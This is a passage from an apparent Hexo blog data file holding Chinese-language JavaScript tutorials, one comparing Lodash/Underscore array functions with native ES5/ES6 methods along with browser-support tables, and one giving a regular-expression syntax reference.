src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">45.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">31.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">7.1 √</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.find</span><br>返回数组中满足提供的检测函数的第一个元素的值，否则返回 undefined<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> users = [</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'barney'</span>,  <span class=\"string\">'age'</span>: <span class=\"number\">36</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'fred'</span>,    <span class=\"string\">'age'</span>: <span class=\"number\">40</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">false</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'pebbles'</span>, <span class=\"string\">'age'</span>: <span class=\"number\">1</span>,  <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">_.find(users, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">o</span>) </span>&#123; <span class=\"keyword\">return</span> o.age &lt; <span class=\"number\">40</span>; &#125;)</span><br><span class=\"line\"><span class=\"comment\">// output: &#123;user: \"barney\", age: 36, active: true&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> users = [</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'barney'</span>,  <span class=\"string\">'age'</span>: <span class=\"number\">36</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'fred'</span>,    <span class=\"string\">'age'</span>: <span class=\"number\">40</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">false</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'pebbles'</span>, <span class=\"string\">'age'</span>: <span class=\"number\">1</span>,  <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">users.find(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">o</span>) </span>&#123; <span class=\"keyword\">return</span> o.age &lt; <span class=\"number\">40</span>; &#125;)</span><br><span class=\"line\"><span class=\"comment\">// output: &#123;user: \"barney\", age: 36, active: true&#125;</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">45.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">25.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">7.1 √</i></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"2、集合-Collection\"><a href=\"#2、集合-Collection\" class=\"headerlink\" title=\"2、集合 Collection\"></a><a name=\"Collection\">2、集合 Collection</a></h4><h4 id=\"3、函数-Function\"><a href=\"#3、函数-Function\" class=\"headerlink\" title=\"3、函数 Function\"></a><a name=\"Function\">3、函数 Function</a></h4><h4 id=\"4、对象-Object\"><a href=\"#4、对象-Object\" class=\"headerlink\" title=\"4、对象 Object\"></a><a name=\"Object\">4、对象 Object</a></h4><h4 id=\"5、字符串-String\"><a href=\"#5、字符串-String\" class=\"headerlink\" title=\"5、字符串 String\"></a><a name=\"String\">5、字符串 String</a></h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><a id=\"You-Dont-Need-Lodash-Underscore\">前言</a></h4><ul>\n<li><p><a href=\"https://github.com/lodash/lodash\" target=\"_blank\" rel=\"noopener\">Lodash</a> 和 <a href=\"https://github.com/jashkenas/underscore\" target=\"_blank\" rel=\"noopener\">Underscore</a> 是非常优秀的现代JavaScript程序库，它们被前端开发人员广泛使用。</p>\n</li>\n<li><p>但是，如果你将目标锁定为现代浏览器，则可能会发现很多原生的方法，已经被原生的 <code>ES5</code> 或者 <code>ES6</code> 支持了。</p>\n</li>\n<li><p>如果你希望你的项目需要更少的依赖关系，并且你清楚地知道你的目标浏览器，那么你可能不需要 <code>Lodash</code> / <code>Underscore</code>。</p>\n</li>\n<li><p>如果你想在更传统的JavaScript执行环境（浏览器？）中使用这些ES5方法，可以使用 <a href=\"https://github.com/es-shims/es5-shim\" target=\"_blank\" rel=\"noopener\">es5-shim</a></p>\n</li>\n</ul>\n<p><a href=\"#array\">1. 数组 Array</a><br><a href=\"#Collection\">2. 集合 Collection</a><br><a href=\"#Function\">3. 函数 Function</a><br><a href=\"#Object\">4. 对象 Object</a><br><a href=\"#String\">5. 字符串 String</a></p>\n<h4 id=\"1、数组-Array\"><a href=\"#1、数组-Array\" class=\"headerlink\" title=\"1、数组 Array\"></a><a name=\"Array\">1、数组 Array</a></h4><p><span style=\"color: #f55; font-size: 16px;\">* _.compact</span><br>返回一个过滤了 <code>falsy</code>（隐含有false属性，<code>false</code>, <code>0</code>, <code>&quot;&quot;</code>, <code>null</code>, <code>undefined</code>, <code>NaN</code>）的值得集合。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\">_.compact([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"literal\">false</span>, <span class=\"number\">2</span>, <span class=\"string\">''</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\">[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"literal\">false</span>, <span class=\"number\">2</span>, <span class=\"string\">''</span>, <span class=\"number\">3</span>].filter(<span class=\"function\"><span class=\"params\">v</span> =&gt;</span> v)</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.5 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">9 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.concat</span><br>将任意的数组或一个值合并成一个新的数组<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">var</span> other = _.concat(array, <span class=\"number\">2</span>, [<span class=\"number\">3</span>], [[<span class=\"number\">4</span>]])</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(other)  <span class=\"comment\">// [1, 2, 3, [4]]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">var</span> other = array.concat(<span class=\"number\">2</span>, [<span class=\"number\">3</span>], [[<span class=\"number\">4</span>]])</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(other)  <span class=\"comment\">// [1, 2, 3, [4]]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">1.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">5.5 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">√</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.fill</span><br>使用从开始到结束，但不包括结束的值填充数组元素<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">_.fill(array, <span class=\"string\">'a'</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(array)    </span><br><span class=\"line\"><span class=\"comment\">// output: ['a', 'a', 'a']</span></span><br><span class=\"line\">_.fill(<span class=\"built_in\">Array</span>(<span class=\"number\">3</span>), <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [2, 2, 2]</span></span><br><span class=\"line\">_.fill([<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>], <span class=\"string\">'*'</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [4, '*', '*', 10]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> array = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">array.fill(<span class=\"string\">'a'</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(array)</span><br><span class=\"line\"><span class=\"comment\">// output: ['a', 'a', 'a']</span></span><br><span class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">3</span>).fill(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [2, 2, 2]</span></span><br><span class=\"line\">[<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>].fill(<span class=\"string\">'*'</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">// output: [4, '*', '*', 10]</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">45.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">31.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">7.1 √</i></td>\n</tr>\n</tbody>\n</table>\n<p><span style=\"color: #f55; font-size: 16px;\">* _.find</span><br>返回数组中满足提供的检测函数的第一个元素的值，否则返回 undefined<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Underscore/Lodash</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> users = [</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'barney'</span>,  <span class=\"string\">'age'</span>: <span class=\"number\">36</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'fred'</span>,    <span class=\"string\">'age'</span>: <span class=\"number\">40</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">false</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'pebbles'</span>, <span class=\"string\">'age'</span>: <span class=\"number\">1</span>,  <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">_.find(users, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">o</span>) </span>&#123; <span class=\"keyword\">return</span> o.age &lt; <span class=\"number\">40</span>; &#125;)</span><br><span class=\"line\"><span class=\"comment\">// output: &#123;user: \"barney\", age: 36, active: true&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Native</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> users = [</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'barney'</span>,  <span class=\"string\">'age'</span>: <span class=\"number\">36</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'fred'</span>,    <span class=\"string\">'age'</span>: <span class=\"number\">40</span>, <span class=\"string\">'active'</span>: <span class=\"literal\">false</span> &#125;,</span><br><span class=\"line\">  &#123; <span class=\"string\">'user'</span>: <span class=\"string\">'pebbles'</span>, <span class=\"string\">'age'</span>: <span class=\"number\">1</span>,  <span class=\"string\">'active'</span>: <span class=\"literal\">true</span> &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">users.find(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">o</span>) </span>&#123; <span class=\"keyword\">return</span> o.age &lt; <span class=\"number\">40</span>; &#125;)</span><br><span class=\"line\"><span class=\"comment\">// output: &#123;user: \"barney\", age: 36, active: true&#125;</span></span><br></pre></td></tr></table></figure></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img src=\"/images/browser/chrome.png\" alt=\"Chrome\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/firefox.png\" alt=\"Firefox\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/ie.png\" alt=\"IE\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/opera.png\" alt=\"Opera\"></th>\n<th style=\"text-align:center\"><img src=\"/images/browser/safari.png\" alt=\"Safari\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">45.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">25.0 √</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">×</i></td>\n<td style=\"text-align:center\"><i style=\"color: #0b0\">7.1 √</i></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"2、集合-Collection\"><a href=\"#2、集合-Collection\" class=\"headerlink\" title=\"2、集合 Collection\"></a><a name=\"Collection\">2、集合 Collection</a></h4><h4 id=\"3、函数-Function\"><a href=\"#3、函数-Function\" class=\"headerlink\" title=\"3、函数 Function\"></a><a name=\"Function\">3、函数 Function</a></h4><h4 id=\"4、对象-Object\"><a href=\"#4、对象-Object\" class=\"headerlink\" title=\"4、对象 Object\"></a><a name=\"Object\">4、对象 Object</a></h4><h4 id=\"5、字符串-String\"><a href=\"#5、字符串-String\" class=\"headerlink\" title=\"5、字符串 String\"></a><a name=\"String\">5、字符串 String</a></h4>"},{"id":"0809026","title":"JavaScript 正则表达式","date":"2017-09-25T07:15:39.000Z","_content":"\n&emsp;正则表达式（英语：`Regular Expression`，在代码中常简写为 `regex`、`regexp` 或 `RE`）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。\n&emsp;搜索模式可用于文本搜索和文本替换。\n\n#### <a>1、什么是正则表达式</a>\n- 正则表达式是由一个字符序列形成的搜索模式；\n\n- 当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容；\n\n- 正则表达式可以是一个简单的字符，或一个更复杂的模式；\n\n- 正则表达式可用于所有文本搜索和文本替换的操作。\n\n#### <a>2、语法</a>\n```js\nvar patt=new RegExp(pattern,modifiers);\n// 或者更简单的方式:\nvar patt=/pattern/modifiers;\n```\n- `pattern`（模式） 描述了表达式的模式；\n- `modifiers`（修饰符） 用于指定全局匹配、区分大小写的匹配和多行匹配。\n  - 注意：当使用构造函数创造正则对象时，需要常规的字符转义规则（在前面加反斜杠 `\\`）。比如，以下是等价的：\n  ```js\n  var reg = new RegExp(\"\\\\w+\");\n  var reg = /\\w+/;\n  ```\n\n#### <a>3、修饰符</a>\n  **`修饰符用于执行区分大小写和全局匹配：`**\n\n| 修饰符 |描述| \n| - | - | \n| i\t| 执行对大小写不敏感的匹配|\n| g | 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）|\n| m\t| 执行多行匹配|\n\n#### <a>4、方括号</a>\n  **`方括号用于查找某个范围内的字符：`**\n\n| 表达式 |  描述  |\n| - | - | \n| [abc]   |\t查找方括号之间的任何字符|\n| [^abc]  |\t查找任何不在方括号之间的字符|\n| [0-9]   |\t查找任何从 0 至 9 的数字|\n| [a-z]   |\t查找任何从小写 a 到小写 z 的字符|\n| [A-Z]   |\t查找任何从大写 A 到大写 Z 的字符|\n| [A-z]   |\t查找任何从大写 A 到小写 z 的字符|\n| [adgk]  |\t查找给定集合内的任何字符|\n| [^adgk] |\t查找给定集合外的任何字符|\n| (red丨blue丨green)  |\t查找任何指定的选项|\n\n#### <a>5、元字符</a>\n  **`元字符（Metacharacter）是拥有特殊含义的字符：`**\n\n| 元字符  |\t描述|\n| - | - | \n| .\t      | 查找单个字符，除了换行和行结束符  |\n| \\w\t    | 查找单词字符  |\n| \\W\t    | 查找非单词字符  |\n| \\d\t    | 查找数字  |\n| \\D\t    | 查找非数字字符  |\n| \\s\t    | 查找空白字符  |\n| \\S\t    | 查找非空白字符  |\n| \\b\t    | 匹配单词边界  |\n| \\B\t    | 匹配非单词边界  |\n| \\0\t    | 查找 NULL 字符  |\n| \\n\t    | 查找换行符  |\n| \\f\t    | 查找换页符  |\n| \\r\t    | 查找回车符  |\n| \\t\t    | 查找制表符  |\n| \\v\t    | 查找垂直制表符  |\n| \\xxx\t  | 查找以八进制数 xxx 规定的字符 |\n| \\xdd\t  | 查找以十六进制数 dd 规定的字符  |\n| \\uxxxx  |\t查找以十六进制数 xxxx 规定的 Unicode 字符 |\n\n#### <a>6、量词</a>\n\n|  量词  |  描述  |\n| - | - | \n| n+\t  | 匹配任何包含至少一个 n 的字符串。<br>例如，/a+/ 匹配 \"candy\" 中的 \"a\"，\"caaaaaaandy\" 中所有的 \"a\"。|\n| n*    | 匹配任何包含零个或多个 n 的字符串。<br>例如，/bo*/ 匹配 \"A ghost booooed\" 中的 \"boooo\"，\"A bird warbled\" 中的 \"b\"，但是不匹配 \"A goat grunted\"。|\n| n?    | 匹配任何包含零个或一个 n 的字符串。<br>例如，/e?le?/ 匹配 \"angel\" 中的 \"el\"，\"angle\" 中的 \"le\"。|\n| n{X}  | 匹配包含 X 个 n 的序列的字符串。<br>例如，/a{2}/ 不匹配 \"candy,\" 中的 \"a\"，但是匹配 \"caandy,\" 中的两个 \"a\"，且匹配 \"caaandy.\" 中的前两个 \"a\"。|\n| n{X, }\t| X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。<br>例如，/a{2,}/ 不匹配 \"candy\" 中的 \"a\"，但是匹配 \"caandy\" 和 \"caaaaaaandy.\" 中所有的 \"a\"。|\n| n{X, Y}| X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。<br>例如，/a{1,3}/ 不匹配 \"cndy\"，匹配 \"candy,\" 中的 \"a\"，\"caandy,\" 中的两个 \"a\"，<br>匹配 \"caaaaaaandy\" 中的前面三个 \"a\"。注意，当匹配 \"caaaaaaandy\" 时，即使原始字符串拥有更多的 \"a\"，匹配项也是 \"aaa\"。|\n| n$\t  | 匹配任何结尾为 n 的字符串。|\n| ^n\t  | 匹配任何开头为 n 的字符串。|\n| ?=n\t  | 匹配任何其后紧接指定字符串 n 的字符串。|\n| ?!n\t  | 匹配任何其后没有紧接指定字符串 n 的字符串。|\n\n#### <a>7、RegExp 对象方法</a>\n\n| 方法  | 描述  |\n| - | - |\n| compile\t| 编译正则表达式 |\n| exec\t  | 检索字符串中指定的值。返回找到的值，并确定其位置|\n| test\t  | 检索字符串中指定的值。返回 true 或 false|\n\n#### <a>8、支持正则表达式的 String 对象的方法</a>\n\n| 方法  | 描述  |\n| - | - |\n| search\t  | 检索与正则表达式相匹配的值|\n| match\t    | 找到一个或多个正则表达式的匹配|\n| replace\t  | 替换与正则表达式匹配的子串|\n| split\t    | 把字符串分割为字符串数组|\n\n","source":"_posts/0809026_JavaScript正则表达式.md","raw":"---\nid: 0809026\ntitle: JavaScript 正则表达式\ndate: 2017-09-25 15:15:39\ntags:\n  - JavaScript\ncategories:\n---\n\n&emsp;正则表达式（英语：`Regular Expression`，在代码中常简写为 `regex`、`regexp` 或 `RE`）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。\n&emsp;搜索模式可用于文本搜索和文本替换。\n\n#### <a>1、什么是正则表达式</a>\n- 正则表达式是由一个字符序列形成的搜索模式；\n\n- 当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容；\n\n- 正则表达式可以是一个简单的字符，或一个更复杂的模式；\n\n- 正则表达式可用于所有文本搜索和文本替换的操作。\n\n#### <a>2、语法</a>\n```js\nvar patt=new RegExp(pattern,modifiers);\n// 或者更简单的方式:\nvar patt=/pattern/modifiers;\n```\n- `pattern`（模式） 描述了表达式的模式；\n- `modifiers`（修饰符） 用于指定全局匹配、区分大小写的匹配和多行匹配。\n  - 注意：当使用构造函数创造正则对象时，需要常规的字符转义规则（在前面加反斜杠 `\\`）。比如，以下是等价的：\n  ```js\n  var reg = new RegExp(\"\\\\w+\");\n  var reg = /\\w+/;\n  ```\n\n#### <a>3、修饰符</a>\n  **`修饰符用于执行区分大小写和全局匹配：`**\n\n| 修饰符 |描述| \n| - | - | \n| i\t| 执行对大小写不敏感的匹配|\n| g | 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）|\n| m\t| 执行多行匹配|\n\n#### <a>4、方括号</a>\n  **`方括号用于查找某个范围内的字符：`**\n\n| 表达式 |  描述  |\n| - | - | \n| [abc]   |\t查找方括号之间的任何字符|\n| [^abc]  |\t查找任何不在方括号之间的字符|\n| [0-9]   |\t查找任何从 0 至 9 的数字|\n| [a-z]   |\t查找任何从小写 a 到小写 z 的字符|\n| [A-Z]   |\t查找任何从大写 A 到大写 Z 的字符|\n| [A-z]   |\t查找任何从大写 A 到小写 z 的字符|\n| [adgk]  |\t查找给定集合内的任何字符|\n| [^adgk] |\t查找给定集合外的任何字符|\n| (red丨blue丨green)  |\t查找任何指定的选项|\n\n#### <a>5、元字符</a>\n  **`元字符（Metacharacter）是拥有特殊含义的字符：`**\n\n| 元字符  |\t描述|\n| - | - | \n| .\t      | 查找单个字符，除了换行和行结束符  |\n| \\w\t    | 查找单词字符  |\n| \\W\t    | 查找非单词字符  |\n| \\d\t    | 查找数字  |\n| \\D\t    | 查找非数字字符  |\n| \\s\t    | 查找空白字符  |\n| \\S\t    | 查找非空白字符  |\n| \\b\t    | 匹配单词边界  |\n| \\B\t    | 匹配非单词边界  |\n| \\0\t    | 查找 NULL 字符  |\n| \\n\t    | 查找换行符  |\n| \\f\t    | 查找换页符  |\n| \\r\t    | 查找回车符  |\n| \\t\t    | 查找制表符  |\n| \\v\t    | 查找垂直制表符  |\n| \\xxx\t  | 查找以八进制数 xxx 规定的字符 |\n| \\xdd\t  | 查找以十六进制数 dd 规定的字符  |\n| \\uxxxx  |\t查找以十六进制数 xxxx 规定的 Unicode 字符 |\n\n#### <a>6、量词</a>\n\n|  量词  |  描述  |\n| - | - | \n| n+\t  | 匹配任何包含至少一个 n 的字符串。<br>例如，/a+/ 匹配 \"candy\" 中的 \"a\"，\"caaaaaaandy\" 中所有的 \"a\"。|\n| n*    | 匹配任何包含零个或多个 n 的字符串。<br>例如，/bo*/ 匹配 \"A ghost booooed\" 中的 \"boooo\"，\"A bird warbled\" 中的 \"b\"，但是不匹配 \"A goat grunted\"。|\n| n?    | 匹配任何包含零个或一个 n 的字符串。<br>例如，/e?le?/ 匹配 \"angel\" 中的 \"el\"，\"angle\" 中的 \"le\"。|\n| n{X}  | 匹配包含 X 个 n 的序列的字符串。<br>例如，/a{2}/ 不匹配 \"candy,\" 中的 \"a\"，但是匹配 \"caandy,\" 中的两个 \"a\"，且匹配 \"caaandy.\" 中的前两个 \"a\"。|\n| n{X, }\t| X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。<br>例如，/a{2,}/ 不匹配 \"candy\" 中的 \"a\"，但是匹配 \"caandy\" 和 \"caaaaaaandy.\" 中所有的 \"a\"。|\n| n{X, Y}| X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。<br>例如，/a{1,3}/ 不匹配 \"cndy\"，匹配 \"candy,\" 中的 \"a\"，\"caandy,\" 中的两个 \"a\"，<br>匹配 \"caaaaaaandy\" 中的前面三个 \"a\"。注意，当匹配 \"caaaaaaandy\" 时，即使原始字符串拥有更多的 \"a\"，匹配项也是 \"aaa\"。|\n| n$\t  | 匹配任何结尾为 n 的字符串。|\n| ^n\t  | 匹配任何开头为 n 的字符串。|\n| ?=n\t  | 匹配任何其后紧接指定字符串 n 的字符串。|\n| ?!n\t  | 匹配任何其后没有紧接指定字符串 n 的字符串。|\n\n#### <a>7、RegExp 对象方法</a>\n\n| 方法  | 描述  |\n| - | - |\n| compile\t| 编译正则表达式 |\n| exec\t  